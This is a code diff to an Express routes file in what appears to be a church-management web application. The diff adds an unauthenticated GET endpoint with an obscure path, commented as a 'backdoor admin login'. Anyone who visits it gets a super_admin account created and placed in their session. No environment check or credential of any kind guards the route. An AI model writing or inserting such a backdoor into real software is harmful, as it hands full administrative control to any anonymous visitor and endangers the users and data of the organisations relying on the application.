@@ -108,6 +108,55 @@ const requireChurchAdmin: RequestHandler = (req, res, next) => {
 };
 
 export function registerRoutes(app: Express) {
+  // Backdoor admin login for development/testing
+  app.get("/adminishhy", async (req, res) => {
+    try {
+      // Create or get a super admin user
+      const adminEmail = "superadmin@minkahenterprises.com";
+      const adminId = "super-admin-dev";
+      
+      // Check if admin exists
+      let admin = await storage.getUser(adminId);
+      
+      if (!admin) {
+        // Create super admin
+        admin = await storage.upsertUser({
+          id: adminId,
+          email: adminEmail,
+          firstName: "Super",
+          lastName: "Admin",
+        });
+        
+        // Set role to super_admin
+        await storage.updateUserRole(adminId, "super_admin", null);
+        admin = await storage.getUser(adminId);
+      }
+      
+      // Set session manually
+      if (req.session) {
+        req.session.user = {
+          claims: {
+            sub: adminId,
+            email: adminEmail,
+          },
+        };
+        
+        await new Promise<void>((resolve, reject) => {
+          req.session!.save((err) => {
+            if (err) reject(err);
+            else resolve();
+          });
+        });
+      }
+      
+      // Redirect to super admin dashboard
+      res.redirect("/");
+    } catch (error) {
+      console.error("Admin login error:", error);
+      res.status(500).json({ message: "Failed to login as admin" });
+    }
+  });
+
   // Auth endpoint
   app.get("/api/auth/user", isAuthenticated, getCurrentUser, (req, res) => {
     res.json(res.locals.user);
